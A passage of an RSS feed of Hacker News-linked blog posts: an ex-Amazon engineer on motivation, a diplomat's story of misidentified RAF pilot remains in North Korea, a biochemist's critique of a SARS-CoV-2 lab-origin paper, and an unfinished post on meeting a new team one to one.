<p>I joined Amazon as an entry level developer. Within 3.5 years I had been promoted twice to a senior engineer, and I was practically guaranteed another promotion to principal engineer this year if I had stayed. My potential at the company was high, I was told.</p>



<p>My esteem within the company grew along the years and I was regarded an expert and a leader in my field. People looked up to me and respected me.</p>



<p>I made $75K in my first year and that gradually grew to $511K by my last year. I could have made another $1M if I stayed another couple of years.</p>



<p>My work‚Äìlife balance was good too, despite Amazon‚Äôs reputation. I didn‚Äôt need to prove myself anymore, and I could get everything done in 40 hours a week. My team worked from home one day a week, and I rarely opened my laptop at night or weekends.</p>



<p>Also, the people I worked with were exceptional. I had three managers in total, and all were generous people with lots of empathy. I‚Äôm very grateful to everyone I worked with.</p>



<p>Everything was going well and getting better. But despite all this, my motivation to go to work each morning was decreasing‚Äîalmost in an inverse trend to my career and income growth.</p>



<figure><img loading="lazy" width="1024" height="576" src="https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=1024%2C576&amp;ssl=1" alt="Rewards up, motivation down." srcset="https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=1100%2C619&amp;ssl=1 1100w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?w=1801&amp;ssl=1 1801w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption>Rewards up, motivation down.</figcaption></figure>



<p>It would have been foolish of me to expect my motivation to start increasing if I got yet another promotion, or another compensation bump, or another big project. But there was something else that was trending down with my motivation. It was my freedom.</p>



<h3>The Motivation Decline</h3>



<p>For the first couple of years my motivation was off the charts. I was mostly working with another person on an internal tool, and there was very little scrutiny around it. It was a time where I had a lot of independence in choosing how to work and what to work on‚Äîat least relative to more recent years.  It was just me and the other person improving this thing, talking to users, releasing updates, testing it, and everything else. Whatever we felt was important, we generally got to do. We did the best work we could for its own sake and we were mostly self-directed.</p>



<p>The last couple of years, however, were quite different. I was leading the most important project in the history of my department, with many stakeholders and complex goals. What I could do was always bounded by my ability to convince all the people involved that it was the best way to navigate our goals. </p>



<p>I was always going to be working on somebody else‚Äôs terms at Amazon. The terms were simple in the beginning (keep fixing the thing), but kept getting more complicated as the years passed by (maximize all goals; satisfy all stakeholders). Then there were other restrictions inherent to working in a large organization about how to do the work, what work to do, what goals to set, and what business was worth pursuing. This situation was squeezing me into doing things that I‚Äôd rather not do, and vice versa.</p>



<h3 id="mce_19">Finding New Motivation</h3>



<p>What kind of work would I do if I had to do it forever? Not something that I did until I reached some milestone (an exit), but something that I would consider satisfactory if I continued to do it until I‚Äôm 80. What is out there that I could do that would make me excited waking up every day for the next 45 years that could also earn me enough money to cover my expenses? Is that too unambitious? I don‚Äôt think so. Because there are two types of drivers that get me out of bed in the morning.</p>



<p>One comes from the outside in the form of a carrot or a stick. For instance, I‚Äôm not automatically driven to do my tax returns every April, but I make sure I do because I don‚Äôt want to go to prison. Or I might not want to work on something I dislike, but I do so anyway because I may need to pay the bills, or want to buy a fancy car. These are the extrinsic motivators.</p>



<p>The other comes from within. This is what drives me to do things when there isn‚Äôt a carrot or a stick. Hobbies are one activity driven by this. But what I was looking for was something that I could do for a living that was also driven by this type of motivation: the intrinsic kind.</p>



<p>Back to the question of whether this is too unambitious. See, I realized that extrinsic motivation doesn‚Äôt last. Whenever I got promoted, it felt good for a week, and then it was as over. When I first hit $100K income, I would take a peek at my W2 for a few days admiring the six digits, but then it wore off. When I hit $200K, $300K, $400K, and $500K, it was the same thing. I would be delusional to think that earning $1M, or $10M would suddenly make it different. And I feel the same with every other extrinsic reward or material possession. Getting them feels good for a while, but this wears off quickly.</p>



<p>The things that don‚Äôt wear off are those that I‚Äôve been doing since I was a kid, when nothing was forcing me to do them. Things such as writing code, selling my creations, charting my own path, calling it like I saw it. I know my strengths, and I know what motivates me, so why not do this all the time? I‚Äôm lucky to live in a time where I can do something independently in my area of expertise without requiring large amounts of capital or outside investors. So that‚Äôs what I‚Äôm doing.</p>



<h3>What‚Äôs Next?</h3>



<p>I‚Äôm going all in on independence, and I‚Äôm going to try to make a living with my own bare hands starting from nothing. I don‚Äôt expect to only do things that I like, but it will be on my terms. My target is to cover my family‚Äôs expenses before I run out of savings while doing something that intrinsically motivates me. What more would I ever want to be satisfied with my work?</p>



<p>If you liked this article, check out:</p>



<ul><li><a href="https://danielvassallo.com/from-employee-to-bootstrapper/">How I set myself up financially before I took the plunge</a>.</li><li><a rel="noreferrer noopener" aria-label="And obviously about what I‚Äôll be doing for a living (opens in a new tab)" href="http://danielvassallo.com/#doing" target="_blank">And what I‚Äôm doing now for a living</a>.</li></ul>



<p>Now that I can use Twitter without being subject to Amazon‚Äôs social media policy, you can <a href="https://twitter.com/dvassallo">follow me there</a> as I continue to document my journey.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>https://danielvassallo.com/only-intrinsic-motivation-lasts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529590</guid>
            <pubDate>Sat, 19 Sep 2020 18:44:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cruel Deception ‚Äì RAF Pilot Remains Discovered in North Korea]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529345">thread link</a>) | @Hansig_jw
<br/>
September 19, 2020 | https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/ | <a href="https://web.archive.org/web/*/https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><strong>A cruel</strong> <strong>deception</strong> ‚Äì <strong>RAF pilot</strong> <strong>remains</strong> discovered in <strong>North Korea</strong> is a story that once I had the full details of the aftermath several years later, quite frankly left me speechless and angry.</p><p>In early 2004, I was contacted at the embassy in Pyongyang by David Hinton, the brother of an RAF pilot who had been shot down in 1952 over North Korea during the Korean war. He said he had been working for several years trying to garner as much information from a variety of primary sources as to the fate of his brother.√Ç&nbsp; He said he now had in his possession most of the details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he later sent to me).</p><p>He then expressed a wish to be able to visit North Korea and hopefully, finally discover the fate of his brother. Could we help?</p><p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p><div id="gallery-1"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/thumbnail-1/#main"><img width="400" height="311" src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" alt="Flt Lt Hinton North Korea" aria-describedby="gallery-1-980" data-lazy-srcset="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?w=400&amp;ssl=1 400w, https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?resize=300%2C233&amp;ssl=1 300w" data-lazy-sizes="(max-width: 400px) 100vw, 400px" data-lazy-src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-1-980"> Flt Lt Hinton with USAF colleagues -Photo David Hinton</figcaption></figure></div><p>I knew that this was going to be a tall order to try and carry out. The Korean War itself was and still is a huge propaganda tool for the Kim dynasty. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p><p>But surprisingly, no.</p><p>Permission was granted for me to meet with the North Korean military and at the initial meeting, I provided them with all the research material sent to me by David Hinton and they said they would investigate.</p><p><em><strong>The</strong><strong> process of making this project happen, working with the North Korean military, I have covered in a previous post</strong></em> <a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/">British Diplomat Works With North Korean Military </a></p><p>Against all expectations, the military did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p><p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. An exact location had been identified and human bones and fragments of uniform and aircraft had been uncovered. <em><strong>This scenario is somewhat similar to my previous post</strong> </em><a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilot√¢‚Ç¨‚Ñ¢s Secret Grave Discovered In Albania</a></p><p>With this discovery, events moved quickly. A visa for David to enter North Korea was fast tracked and he duly arrived hopeful for some form of final closure. During his visit, he was treated as an honoured guest by the North Koreans and enjoyed the rare distinction of being accompanied throughout his visit by a senior Korean People‚Äôs Army officer, Colonel Kwak Chol-hui, who was at that time Director of Negotiations for Remains at the armistice site at Panmunjom.</p><p>So, on the day appointed to visit the village to view the grave, we arrived early and were met by the Colonel and both witnesses who then led us to the gravesite which was a short distance away.</p><p>The grave consisted simply of a mound of earth surrounded by a white picket fence, without any inscription. It lay close to a narrow footpath on a hillside 200 meters from the road.</p><p>David was introduced at the grave to the two witnesses to Desmond‚Äôs crash, a Mr Ri and Mr Han, local villagers who were only 13-years old at the time of the incident but who still appeared to have perfect recollections of the event. Perhaps a little too perfect and too detailed I thought at the time. But, maybe it was just me being a tad too cynical.</p><p>David then gave a short speech at the grave, thanking Colonel Kwak and the British embassy for making his visit possible, while the head of the village promised to tend the grave and paint the fence regularly.</p><p>We spent about 2 hours in the village and at the gravesite before it was time to leave. We said farewell to the Colonel and the witnesses and set off back to Pyongyang and David left North Korea the next day.</p><p>Upon his return to the UK, he was kind enough to send me copies of the many photographs he had taken that day and which I still have.</p><p>I learnt later that in 2011, a casket containing the bones of Flt Lt Hinton had been passed with great ceremony to the then British ambassador to North Korea for repatriation and presumably for burial at the UN Korean War cemetery in Busan, South Korea.</p><p><strong>And here the story would have finally ended. But no!</strong></p><p>The British Daily Mail ran a story on 17th June 2018 that was a shocker to me. It was revealed that subsequent DNA testing carried out on the bones after the repatriation identified them not as those of Flt Lieutenant Hinton but those of an animal!</p><p>According to the paper, family members were informed but the media was kept in the dark for fear of damaging relations between North Korea and the UK. Don‚Äôt you just love political machinations!</p><p>The paper then went on to quote the source as the memoirs of Mr Thae Yong-Ho, a North Korean diplomat who was Deputy North Korean Ambassador to the UK at the time and who defected to South Korea in 2016.</p><p>It also came as North Korean dictator Kim Jong Un had agreed with US President Donald Trump at their Singapore summit that all remains of US servicemen who died in the Korean War would now be returned.</p><p>Interestingly, the New York Times ran a story on 1st August 2018 detailing how difficult it had been to identify remains of American MIA‚Äôs handed over by the North Koreans to the US as a result of the Agreement with the paper also quoting the Hinton DNA story.</p><p>Mr Thae maintained that the Hinton episode was a case of crass incompetence. He also stated that Britain did protest but North Korean officials countered by saying they lacked the proper equipment to distinguish human from animal bones.</p><p>To this day, I cannot believe how stupid the North Koreans behaved in this matter. They must have known that DNA would be carried out on the bones.√Ç&nbsp; If so, why did they release them?</p><p>A country that has a nuclear programme, the ability to launch missiles and a sophisticated scientific infrastructure coming out with such a lame excuse just didn‚Äôt hold water.</p><p>I might add that at the time of the Hinton project, Mr Thae was well known to the embassy in Pyongyang, both professionally and socially. He was an experienced diplomat at the Ministry of Foreign Affairs where as part of his portfolio, he was in charge of the UK desk, hence the contacts. So, he would have been well aware (and probably involved behind the scenes) in what developed.</p><p>So what should have been a positive North Korean story about the discovery and dignified burial of a fallen RAF pilot and the assistance given to a close relative to enable him to pay his last respects, in the end turned out to be nothing but a cruel and wicked deception.</p><p><em><strong>Sources:</strong></em></p><p>https://www.dailymail.co.uk/news/article-5852503/Remains-RAF-hero-shot-North-Korea-2011-turns-animal-bones.html</p><p>‚ÄúCryptography From the Third-<wbr>Floor Secretariat√¢‚Ç¨ÔøΩ 2018 Thae Yong-Ho</p><div heateor-sss-data-href="https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/"><p>Spread the love</p><ul><li><a data-pin-lang="en_US" href="https://www.pinterest.com/pin/create/button/?url=https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/" data-pin-count="false" data-pin-do="buttonPin" data-pin-config="beside"><img src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845" data-recalc-dims="1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845"></a></li></ul></div></div></div>]]>
            </description>
            <link>https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529345</guid>
            <pubDate>Sat, 19 Sep 2020 18:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Discussion of Li-Meng Yan's Paper on SARS-CoV-2]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24529261">thread link</a>) | @akvadrako
<br/>
September 19, 2020 | https://www.randombio.com/ratg132.html | <a href="https://web.archive.org/web/*/https://www.randombio.com/ratg132.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- change font to prevent FauI coming out as Faul -->
<section>

<p>
<span> <img src="https://www.randombio.com/O40gray-gray.png" alt="O" title="O"></span>
n September 14 2020, Li-Meng Yan, a dissident Chinese virologist, along with three
colleagues, posted an article at <a href="https://zenodo.org/record/4028830">zenodo.org</a>
<sup>[1]</sup> claiming to prove that SARS-CoV-2 was artificially created. Twitter 
canceled the author's account two days later and political activists vociferously 
attacked the paper on political grounds. It is clear that many people don't want to 
hear her evidence. But the issue is extremely important. If the virus was produced 
in an experiment and accidentally released, as this paper claims, it means the Wuhan 
Institute of Virology is in dire need of upgrades to their virus-handling procedures 
to prevent it from happening again.
</p><p>
My background is 30 years as a researcher in protein biochemistry using biophysical 
techniques and molecular biology, including design, cloning, and expression of 
recombinant proteins, to study protein function and structure. Here's a brief
summary of the argument put forward in the paper along with my comments.
</p><p>
<i>Update, Sep 20 2020</i>: I've expanded the comments to describe the evidence they
would need to make their case more convincing.
</p><hr><p>
<b>Claim 1:</b> 
   ‚Äú[the sequences of] RaTG13, RmYN02, and several pangolin viruses recently
   published are highly suspicious and likely fraudulent.‚Äù
   ‚ÄúThe RaTG13 virus is excluded from this analysis given the strong evidence 
   suggesting that its sequence may have been fabricated and the virus does not exist 
   in nature.‚Äù
</p><p>
<b>Comment:</b>
   RaTG13 was published by Shi Zhengli at the same time as the SARS-CoV-2 sequence. 
   In 2013 Shi also published a partial gene segment of RaBtCoV/4991, which is identical 
   to RaTG13, but it is incomplete. The authors say that the WIV took this partial
   sequence and fraudulently added the remainder to exculpate themselves, trying
   to make it appear that RaTG13 was a pre-existing virus. 
</p><p>
   Evidence in favor of this claim is that Shi <i>et al.</i> made no mention of 
   RaBtCoV/4991 in their 2020 paper. But unless someone wants to claim that 4991 
   was also fabricated, RaBtCoV/4991 had to come from somewhere, which is to say it is 
   a real virus. So Claim 1 doesn't make sense. 
</p><p>
<b>What is needed:</b>
   To prove this the authors would have to find another virus that is 100% identical 
   with the published partial RaBtCoV/4991 sequence but which differs from RaTG13. 
</p><hr><p>

<b>Claim 2:</b> 
   The WIV could have used transgenic hACE2 transgenic mice to improve the virus's
   ability to bind to its receptor. ‚ÄúThis animal model 
   has been established during the study of SARS-CoV and has been available in the 
   Jackson Laboratory [a commercial supplier of transgenic mice] for many years.‚Äù
   However, hACE2 mice are ‚Äúnot a good model to reflect the virus' transmissibility
   and associated clinical symptoms in humans.‚Äù If they had used golden Syrian
   hamster instead, the authors say, ‚Äúthe highly contagious nature of SARS-CoV-2 
   would be extremely evident‚Äù and they could have released accurate information.
</p><p>
<b>Comment:</b> 
   This is a good point. If true, it would tend to exculpate the Chinese researchers.
   But we already know many techniques they could have used. No one was claiming 
   that making the virus was impossible. 
</p><p>
<b>What is needed:</b> 
   Sending live animals to another country requires tons of paperwork. They would need
   Jax's sales records or government export records (which might be available via a
   FOIA request). 
</p><hr><p>
<b>Claim 3:</b> 
   The paper provides a flow chart for how the virus could have been constructed.
   ‚ÄúTwo restriction sites are present at either end of the RBM [receptor-binding
   motif] of SARS-CoV-2, providing convenience for replacing the RBM within the spike 
   gene.‚Äù
</p><p>
<b>Comment:</b> 
   The spike protein consists of two parts: S1, which binds to the receptor, and S2,
   which fuses the viral and cellular membranes. The point where the subunits are joined 
   is called the S1/S2 site. Proteolysis of this site is essential for infection.
   The RBM is the part of S1 that binds to the receptor. A common technique is 
   to take functional domains out of one protein and put them into another. The easiest 
   way to do this is by finding (or creating) restriction sites in the DNA that allow 
   you to cut the DNA in a specific place.
</p><p>
   The flow chart is quite reasonable, but again no one doubted that artificially 
   creating the virus is possible. So describing how someone could have done it
   doesn't tell us much; any competent molecular biologist could come up with
   a similar scheme.
</p><p>
   The article makes a big deal about the presence of restriction sites on the S1/S2 
   sequence, including an <code>EcoRI</code> site and a <code>BstEII</code> site. 
   But this does not indicate engineering. Many restriction sites occur naturally by 
   chance. Their presence is not unusual, but they are a major inconvenience for those 
   of us who try to clone DNA‚Äîmany restriction sites we might wish to use are 
   ruled out by the presence of another one in an inconvenient location. The 
   probability of finding one of over a thousand known 
   <a href="http://rebase.neb.com/rebase/rebase.html">restriction sites</a> at an 
   arbitrary location in a 3800 base sequence by chance is very high.
</p><p>
<b>What is needed:</b> 
   To prove this convincingly, the authors would need to find an authentic copy 
   of the original virus sequence without the restriction sites to show what the virus 
   was like before the supposed change was made. 
</p><hr><p>
<b>Claim 4:</b> 
   The furin cleavage site contains rare codons, an unusual sequence not shared by other 
   lineage B betacoronaviruses, and a <code>FauI</code> restriction site. It 
   could not have been introduced by evolution, say the authors, and the probability 
   of successful homologous recombination ever occurring among the ancestors of these 
   viruses is low. ‚ÄúA  <code>FauI</code> restriction site is formulated by the codon choices 
   here, suggesting the possibility that the restriction fragment length polymorphism,
   a technique that a WIV lab is proficient at, could have been involved.‚Äù
   The authors suggest that the <code>FauI</code> site was added to monitor the presence
   of the furin-cleavage site.
</p><p>
<b>Comment:</b> 
   The furin cleavage site is known to increase the tropism of the virus, and it is 
   now known that the virus even infects the brain, but there is little evidence so
   far that it increases pathogenicity. There is as yet no good explanation for the 
   presence of the furin cleavage site. 
</p><p>
   It might make sense for a virus creator to put a restriction site in the middle of
   the furin cleavage site to make sure it didn't disappear. RFLP analysis is a simple 
   technique and any molecular biology lab could handle it easily. However, as mentioned,
   restriction sites pop up randomly all the time, so finding one proves little.
</p><p>
<b>What is needed:</b> 
   The <code>FauI</code> restriction site is a red herring. To prove that the furin cleavage
   site was added, the authors would have to find a trail of evidence showing step
   by step how the sequence was manipulated from whatever virus the WIV started from.
   It would also be helpful to have data showing that furin cleavage increases 
   pathogenicity. This is plausible but it needs to be shown experimentally.
</p><hr><p>
<b>Claim 5:</b> 
   WIV most likely used ZC45 and ZXC21, not RaTG13, to create SARS-CoV-2 because RaTG13 is 
   not real. The reasoning behind this claim is that the S1 sequence of SARS-CoV-2 
   is quite similar to these other viruses except for the receptor-binding motif and 
   furin-cleavage sites. Also, two other proteins on these viruses, the Orf8 protein 
   and E protein, are 94.2% and 100% identical to SARS-CoV-2.
</p><p>
<b>Comment:</b> 
   This is indeed strange but so far circumstantial.
</p><p>
<b>What is needed:</b> 
   The authors need to prove that RaTG13 is not real. They claim to have evidence,
   and I look forward to seeing it,  but to be convincing it would have to be more 
   than the discovery of mysterious unexplained features in the DNA sequence.
</p><hr><p>
The authors say they plan to prove that RaTG13 is fabricated in a follow-up report. 
If they can do this, it would be solid evidence of consciousness of guilt on the part 
of WIV researchers. However, the current paper doesn't say very much more than what 
other bloggers have already revealed.
</p><p>
It would be premature to draw any conclusion about the origins of the virus from this
paper. The authors have set for themselves a difficult and possibly impossible task: 
finding a signature of intel¬≠ligent design in a virus is much like what the 
creationists have been doing without success for years. 
</p><p>
But what is not premature is that social media giants deciding for us what is 
true and what is false may turn out to be as big a threat as the virus. It is unfair 
and unscientific to dismiss ideas that one doesn't want to hear as ‚Äúconspiracy 
theories‚Äù as many people are doing. 
</p><hr><p>
1. Yan LM, Kang S, Guan J, Hu S (2020). Unusual Features of the SARS-CoV-2 
Genome Suggesting Sophisticated Laboratory Modification Rather Than Natural 
Evolution and Delineation of Its Probable Synthetic Route.
https://zenodo.org/record/4028830
</p><hr><p>
<i>
sep 16 2020, 6:52 pm (Updated Sep 20 2020)
</i>
</p>
</section>
</div></div>]]>
            </description>
            <link>https://www.randombio.com/ratg132.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529261</guid>
            <pubDate>Sat, 19 Sep 2020 17:57:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Meeting everyone on a new team]]>
            </title>
            <description>
<![CDATA[
Score 194 | Comments 45 (<a href="https://news.ycombinator.com/item?id=24529176">thread link</a>) | @craigkerstiens
<br/>
September 19, 2020 | https://www.annashipman.co.uk/jfdi/meeting-everyone.html | <a href="https://web.archive.org/web/*/https://www.annashipman.co.uk/jfdi/meeting-everyone.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="meeting-everyone">
    
    <date>17 September 2020</date>
      <p>When I joined the Financial Times as Technical Director for FT.com, I inherited a team of around 50 engineers. One of the first things I did was meet each of them for a one-to-one. I was initially resistant, but it was extremely valuable, I‚Äôm glad I did it, and I would definitely do it again in a future role.</p>

<h2 id="my-mentors-advice-about-the-content-of-the-meeting">My mentor‚Äôs advice about the content of the meeting</h2>

<p>The idea was suggested to me by a mentor, who‚Äôd been advised to do it by <em>his</em> mentor, a Rear Admiral, who said this was something you should do whenever you have a team of fewer than 150 people. My mentor gave me some tips:</p>

<ul>
  <li>Be clear about whether you will take action or whether this is for information only.</li>
  <li>This should mostly be about listening ‚Äì you should talk for maybe 5 minutes and they should talk for 25.</li>
  <li>It‚Äôs to find out what‚Äôs going well and what‚Äôs not going well.</li>
  <li>It‚Äôs informal, but make sure it‚Äôs in an enclosed meeting room so that people feel they can speak freely.</li>
  <li>Sometimes it will be quite boring, sometimes you may just learn a lot about someone‚Äôs family or hobbies, but that is useful from a getting to know people/relationship-building perspective and it means that you know some things about that person.</li>
  <li>Aim is to get a bit about their background, their priorities and their pressures.</li>
</ul>

<h2 id="making-time-was-hard">Making time was hard</h2>

<p>I was initially resistant because of the time commmitment. With a team of ~50, that‚Äôs a lot of hours, and I was also working four days a week so each meeting takes up a greater proportion of time. However, once I‚Äôd made the decision to do this and announced my intention, it was important to me to follow through, so I made sure to make time.</p>

<p>I scheduled four of these 1:1s a week, starting with the people reporting directly to me and then on down the management chain.</p>

<h2 id="i-ran-each-meeting-in-the-same-way">I ran each meeting in the same way</h2>

<p>Firstly I ran through everything I planned to cover, and then stepped through it.</p>


<ul>
  <li>I am asking the same questions to everyone</li>
  <li>This is information for me only to get an idea of themes and how things are going; I‚Äôm not explicitly planning to take action on anything we discuss, so if something comes up that I need to take action on, let‚Äôs make sure we discuss that after this meeting</li>
  <li>This is confidential. If you say something about someone else I‚Äôm not going to go and tell them. I may report on ‚Äòwhat people are saying‚Äô, but I‚Äôll say ‚Äòthe engineers feel‚Äô or ‚Äòan engineer said‚Äô; I won‚Äôt say ‚Äú[Your name] said‚Ä¶‚Äù</li>
</ul>

<h3 id="what-were-going-to-discuss">What we‚Äôre going to discuss</h3>

<ul>
  <li>First I‚Äôll introduce myself, and tell you a bit about my background</li>
  <li>Then, if you like, I‚Äôd love you to tell me a bit about yourself ‚Äì as much or as little as you feel like sharing</li>
  <li>Then we‚Äôll discuss the following questions:</li>
</ul>

<ol>
  <li>What do you think the most important things we should be doing over the next year?</li>
  <li>What will get in the way of us doing that?</li>
  <li>What‚Äôs going well, i.e. what should we make sure we don‚Äôt change?</li>
  <li>Is there anything you think I should know about?</li>
</ol>

<h2 id="is-there-anything-i-should-know-about">Is there anything I should know about?</h2>

<p>When I asked this question I talked a bit about why I was asking. I explained that I might not necessarily see or know things that may seem apparent to them, and while they should always feel able to bring things to me, now was a good opportunity to do so. It was an opportunity to make sure I‚Äôve heard what‚Äôs important to you, what things should change and what things should stay the same.</p>

<p>This question always elicited very interesting responses, from organisational issues, to personal information people felt it was valuable for me to know about them.</p>

<h2 id="i-told-them-what-i-was-planning-to-ask-in-advance">I told them what I was planning to ask in advance</h2>

<p>I put all the information in the meeting invite.</p>

<div>
<p>I mentioned that I wanted to have a chat with everyone on FT.com to understand how things are going, does this time suit you for this?</p>

<p>The meeting agenda is the same for everyone; a quick intro and then the following questions (I'll go through this in the meeting too):</p>

<ul>
<li>What do you think the most important things we should be doing over the next year?</li>
<li>What will get in the way of us doing that?</li>
<li>What‚Äôs going well, i.e. what should we make sure we don‚Äôt change?</li>
<li>Is there anything you think I should know about?</li>
</ul>

<p>Thanks,</p>
<p>Anna</p>
</div>

<p>Some people did not read the meeting invite and came with no idea what the meeting was about. Some people had fully prepared and written notes that they then read out to me. Actually people having prepared sometimes was less useful, because sometimes it led the conversation to solutions rather than problems. However it was great that people had really given it some thought.</p>

<h2 id="making-notes-felt-too-much-like-a-promise">Making notes felt too much like a promise</h2>

<p>Each meeting was half an hour. In the very first one, I made notes in a notebook, but I realised that created an implicit commitment that I was going to take action on everything that was said, even though I had said it was information only.</p>

<p>However, I do not have a very good memory, so for all the subsequent ones I made a few notes after each meeting of key themes. This meant I couldn‚Äôt do more than two in a row or go straight into another meeting, so it made scheduling slightly harder. These days, people are much more aware of the shorter meeting approach so if doing this again, I‚Äôd go for the ‚Äòtherapy hour‚Äô ‚Äì 25 minutes for conversation then 5 minutes for me to make the notes.</p>

<h2 id="introducing-myself">Introducing myself</h2>

<p>In my intro, I gave a potted career history. Starting from my degree in philosophy, and my first career in <a href="https://www.barringtonstoke.co.uk/">children‚Äôs book publishing</a>, through teaching myself to code, my <a href="https://www.hw.ac.uk/study/uk/postgraduate/information-technology-software-systems.htm">masters in Software Systems</a> and then my 15+ year career in programming, infrastructure and operations, technical architecture, and my previous role as <a href="https://www.annashipman.co.uk/jfdi/a-year-in-the-life-os-lead.html">Open Source lead</a>. I also talked about what appealed to me about the job as Technical Director at the FT.</p>

<p>I said roughly the same thing to everyone. I don‚Äôt normally introduce myself and give my background, but in this case I thought that as a new Tech Director most of them would not be working closely with me, and I would not be contributing code, so it was worth giving my credentials.</p>

<p>My mentor had suggested I also say something personal. I think he intended something like ‚Äúmarried with two children‚Äù (or whatever), but instead, I tried to give a different kind of personal detail, something about my interests. I tried to come up with a different one for each conversation, for example something about my <a href="https://twitter.com/annashipman/status/1043917006477643777">cross-stitch hobby</a>.</p>

<p>This part was the hardest part for me, because prior to this I had generally enjoyed keeping a clear boundary between work stuff and personal stuff, so that definitely didn‚Äôt cover talking about cross-stitch, or my home life, on a first meeting. However, I had been trying to bring more of my personal self to work, and this part of the intro did lead to some really interesting conversations and I think helped make a better connection.</p>

<p>Of course, these days, when we are all at home, my personal life is in meetings with me, so it‚Äôs good I‚Äôd already started on that journey!</p>

<p>Giving so much information in my introduction also allowed the other person to introduce themselves how they wanted. Some talked career history, some focused on their hobbies, others were really open about their lives and aspirations.</p>

<h2 id="i-am-so-glad-i-did-this">I am so glad I did this</h2>

<p>My mentor was wrong about one thing ‚Äì&nbsp;none of the conversations were boring.</p>

<p>In my first few months in the new job, I often felt really stretched for time, but I never regretted a single one of these meetings; it was always extremely interesting, my team are brilliant and it was great to meet them one on one, and each conversation always contained some valuable information.</p>

<p>There were two very valuable things about this for me.</p>

<p>The first was getting an idea of what change was needed. These meetings gave me a brilliant insight that wasn‚Äôt available elsewhere. Patterns started emerging very quickly, and formed the basis of our <a href="https://medium.com/ft-product-technology/the-difficult-teenage-years-setting-tech-strategy-after-a-launch-7f42eb94a424">tech strategy</a>.</p>

<p>The second was building relationships. A lot of the people I had 1:1s with I would not have come into contact with during the course of the ordinary working week. It would have taken time to meet everyone at socials, and it wouldn‚Äôt have been the same quality of conversation. I still feel, two years on, that I know a bit about all the people I had those conversations with, which has felt to me like a good foundation for our subsequent conversations.</p>

<p>It was also good, as someone who is a bit shy, to have names to faces quite quickly and people to say hello to when walking round the office.</p>

<h2 id="was-it-useful-for-my-team">Was it useful for my team?</h2>

<p>About a year later, I asked some of the people with whom I‚Äôd had these conversations whether they‚Äôd been useful (in an anonymous form).</p>

<p>All of the people who responded said they found the conversation valuable, and some of their comments were:</p>

<ul>
